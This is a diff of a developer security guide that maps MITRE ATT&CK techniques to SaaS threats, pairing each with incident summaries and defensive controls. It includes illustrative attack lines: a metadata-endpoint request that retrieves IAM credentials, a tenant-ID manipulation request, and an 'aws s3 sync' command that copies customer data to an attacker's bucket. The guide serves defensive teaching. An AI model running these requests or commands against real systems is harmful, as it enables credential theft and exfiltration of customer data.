@@ -6,25 +6,25 @@
 
 ## Why SaaS Is Different
 
-A traditional web app has one "tenant" — the organisation running it. A SaaS product has many tenants sharing the same infrastructure. This creates unique attack surfaces:
+A traditional web app has one "tenant": the organisation running it. A SaaS product has many tenants sharing the same infrastructure. This creates unique attack surfaces:
 
-- **Tenant isolation failures** — one customer's data leaks into another's
-- **Identity provider compromise** — attacking the IdP (Okta, Auth0, Azure AD) affects all tenants
-- **OAuth grant abuse** — malicious apps gain persistent access via legitimate OAuth flows
-- **Admin plane attacks** — the SaaS control plane (billing, user management, feature flags) is itself an attack target
-- **Insider threat at scale** — a compromised SaaS employee can access all tenant data
+- **Tenant isolation failures**: one customer's data leaks into another's
+- **Identity provider compromise**: attacking the IdP (Okta, Auth0, Azure AD) affects all tenants
+- **OAuth grant abuse**: malicious apps gain persistent access via legitimate OAuth flows
+- **Admin plane attacks**: the SaaS control plane (billing, user management, feature flags) is itself an attack target
+- **Insider threat at scale**: a compromised SaaS employee can access all tenant data
 
 ---
 
-## Initial Access (TA0001) — SaaS Focus
+## Initial Access (TA0001): SaaS Focus
 
-### T1078 — Valid Accounts
+### T1078: Valid Accounts
 
 The most common SaaS initial access vector. Attackers use:
 
-- **Credential stuffing** — automated login attempts with breached email/password pairs
-- **Password spraying** — trying common passwords against every account to avoid lockout
-- **Session token theft** — XSS or network interception stealing authentication cookies/tokens
+- **Credential stuffing**: automated login attempts with breached email/password pairs
+- **Password spraying**: trying common passwords against every account to avoid lockout
+- **Session token theft**: XSS or network interception stealing authentication cookies/tokens
 
 **Real story:** The 2022 Okta breach began when the LAPSUS$ group compromised a support engineer's laptop via T1078.003 (Cloud Accounts). Because Okta's support team had access to customer tenants, this gave attackers visibility into hundreds of customers' user lists.
 
@@ -32,18 +32,18 @@ The most common SaaS initial access vector. Attackers use:
 - Enforce MFA for all users; make it mandatory, not optional
 - Implement anomaly-based login detection (new country, new device)
 - Bind sessions to the originating IP range or use device fingerprinting
-- Use short-lived access tokens (15–60 minutes); refresh tokens should rotate on use
+- Use short-lived access tokens (15 to 60 minutes); refresh tokens should rotate on use
 
-### T1566 — Phishing
+### T1566: Phishing
 
 Targeting your users or employees via email to harvest credentials or OAuth tokens.
 
 **Developer controls:**
 - Publish a DMARC, DKIM, and SPF policy to prevent email spoofing of your domain
 - Warn users when emails arrive from addresses similar to your domain
-- Implement login anomaly alerts ("We noticed a login from a new device in Berlin — was this you?")
+- Implement login anomaly alerts ("We noticed a login from a new device in Berlin: was this you?")
 
-### T1195 — Supply Chain Compromise
+### T1195: Supply Chain Compromise
 
 Third-party integrations, npm packages, and CI/CD tooling in your pipeline are all initial access vectors.
 
@@ -54,9 +54,9 @@ Third-party integrations, npm packages, and CI/CD tooling in your pipeline are a
 
 ---
 
-## Persistence (TA0003) — SaaS Focus
+## Persistence (TA0003): SaaS Focus
 
-### T1098 — Account Manipulation
+### T1098: Account Manipulation
 
 After initial access, attackers create new admin accounts, add themselves to groups, or register persistent OAuth applications.
 
@@ -64,32 +64,32 @@ After initial access, attackers create new admin accounts, add themselves to gro
 
 | Sub-technique | Description |
 |--------------|-------------|
-| T1098.001 | Additional Cloud Credentials — adding SSH keys or API tokens to a compromised account |
-| T1098.003 | Additional Cloud Roles — elevating a compromised account to admin |
-| T1098.005 | Device Registration — registering a new MFA device to maintain access |
+| T1098.001 | Additional Cloud Credentials: adding SSH keys or API tokens to a compromised account |
+| T1098.003 | Additional Cloud Roles: elevating a compromised account to admin |
+| T1098.005 | Device Registration: registering a new MFA device to maintain access |
 
-**Real story:** In the 2023 Microsoft Exchange Online breach (attributed to Storm-0558), attackers forged authentication tokens to maintain persistent access to email accounts across tenants — a T1098.001 variant using a stolen signing key.
+**Real story:** In the 2023 Microsoft Exchange Online breach (attributed to Storm-0558), attackers forged authentication tokens to maintain persistent access to email accounts across tenants: a T1098.001 variant using a stolen signing key.
 
 **Developer controls:**
 - Alert immediately when new API keys, OAuth apps, or admin accounts are created
 - Require approval workflows for admin role grants
 - Audit MFA device registrations; alert on new device additions
-- Implement "break glass" account monitoring — alert on every use of super-admin credentials
+- Implement "break glass" account monitoring: alert on every use of super-admin credentials
 
-### T1505.003 — Web Shell
+### T1505.003: Web Shell
 
 In containerised SaaS, persistence via filesystem is rarer, but attackers may plant malicious Lambda functions, webhooks, or serverless jobs.
 
 **Developer controls:**
 - Treat infrastructure as code; any resources not in your IaC definitions should trigger alerts
 - Audit cloud functions and scheduled jobs regularly
-- Use GitOps — all infrastructure changes go through reviewed pull requests
+- Use GitOps: all infrastructure changes go through reviewed pull requests
 
 ---
 
-## Privilege Escalation (TA0004) — SaaS Focus
+## Privilege Escalation (TA0004): SaaS Focus
 
-### T1078.004 — Cloud Accounts
+### T1078.004: Cloud Accounts
 
 SaaS applications run on cloud infrastructure. Over-permissioned service accounts are the primary privilege escalation path.
 
@@ -114,9 +114,9 @@ GET http://169.254.169.254/latest/meta-data/iam/security-credentials/MyRole
 - Scope IAM roles to minimum required permissions; review with AWS IAM Access Analyzer
 - Use dynamic short-lived credentials (AWS Roles, Workload Identity) rather than long-lived keys
 
-### T1548 — Abuse Elevation Control Mechanism
+### T1548: Abuse Elevation Control Mechanism
 
-In multi-tenant SaaS, this often manifests as horizontal privilege escalation — accessing another tenant's data by manipulating a tenant ID in an API request.
+In multi-tenant SaaS, this often manifests as horizontal privilege escalation: accessing another tenant's data by manipulating a tenant ID in an API request.
 
 ```
 # Insecure: tenant ID comes from the request
@@ -134,13 +134,13 @@ GET /api/invoices?tenant_id=99999
 
 ---
 
-## Lateral Movement (TA0008) — SaaS Focus
+## Lateral Movement (TA0008): SaaS Focus
 
-### T1199 — Trusted Relationship
+### T1199: Trusted Relationship
 
 SaaS products often grant elevated access to integration partners, resellers, or support tools. Compromising these gives attackers a path into customer tenants.
 
-**Real story:** The Okta breach (above) is a textbook example of T1199 — the attacker didn't attack Okta's core systems; they compromised a third-party support tool that had trusted access to customer data.
+**Real story:** The Okta breach (above) is a textbook example of T1199: the attacker didn't attack Okta's core systems; they compromised a third-party support tool that had trusted access to customer data.
 
 **Developer controls:**
 - Apply least-privilege to all partner/support access; support agents should not have read access to customer data by default
@@ -148,7 +148,7 @@ SaaS products often grant elevated access to integration partners, resellers, or
 - Log all support access; surface it to customers in their audit log
 - Require MFA for all third-party support tool access
 
-### T1552 — Unsecured Credentials in Configuration
+### T1552: Unsecured Credentials in Configuration
 
 Service-to-service credentials hardcoded in configuration files, environment variables, or container images allow lateral movement if one service is compromised.
 
@@ -159,9 +159,9 @@ Service-to-service credentials hardcoded in configuration files, environment var
 
 ---
 
-## Collection (TA0009) — SaaS Focus
+## Collection (TA0009): SaaS Focus
 
-### T1530 — Data from Cloud Storage
+### T1530: Data from Cloud Storage
 
 In SaaS, the most valuable data lives in databases, object storage (S3, GCS), and data warehouses. Misconfigured access policies are the primary risk.
 
@@ -180,7 +180,7 @@ In SaaS, the most valuable data lives in databases, object storage (S3, GCS), an
 - Enable encryption at rest with customer-managed keys (CMK) for sensitive data
 - Turn on CloudTrail and S3 server access logging; alert on unusual bulk access
 
-### T1213 — Data from Information Repositories
+### T1213: Data from Information Repositories
 
 Internal tooling (Confluence, Notion, Slack) often contains credentials, architecture diagrams, and customer data. Attackers with employee-level access mine these.
 
@@ -191,11 +191,11 @@ Internal tooling (Confluence, Notion, Slack) often contains credentials, archite
 
 ---
 
-## Exfiltration (TA0010) — SaaS Focus
+## Exfiltration (TA0010): SaaS Focus
 
-### T1537 — Transfer Data to Cloud Account
+### T1537: Transfer Data to Cloud Account
 
-An attacker with IAM credentials can copy data directly to their own cloud account — bypassing network egress controls entirely.
+An attacker with IAM credentials can copy data directly to their own cloud account: bypassing network egress controls entirely.
 
 ```bash
 # Attacker with stolen credentials:
@@ -209,18 +209,18 @@ aws s3 sync s3://your-customer-data s3://attacker-bucket --source-region us-east
 
 ---
 
-## Impact (TA0040) — SaaS Focus
+## Impact (TA0040): SaaS Focus
 
-### T1485 — Data Destruction
+### T1485: Data Destruction
 
-Ransomware groups increasingly target SaaS data stores — deleting database backups and cloud storage before demanding payment.
+Ransomware groups increasingly target SaaS data stores: deleting database backups and cloud storage before demanding payment.
 
 **Real story:** Multiple AWS customers have suffered attacks where IAM credentials were stolen and used to delete S3 objects and RDS snapshots before the attacker notified the victim and requested payment.
 
 **Developer controls:**
 - Enable S3 Object Lock (WORM storage) for backups
 - Enable MFA Delete on critical S3 buckets
-- Test your backup restore process quarterly — a backup you haven't tested isn't a backup
+- Test your backup restore process quarterly: a backup you haven't tested isn't a backup
 - Keep backups in a separate AWS account with minimal cross-account permissions
 
 ---
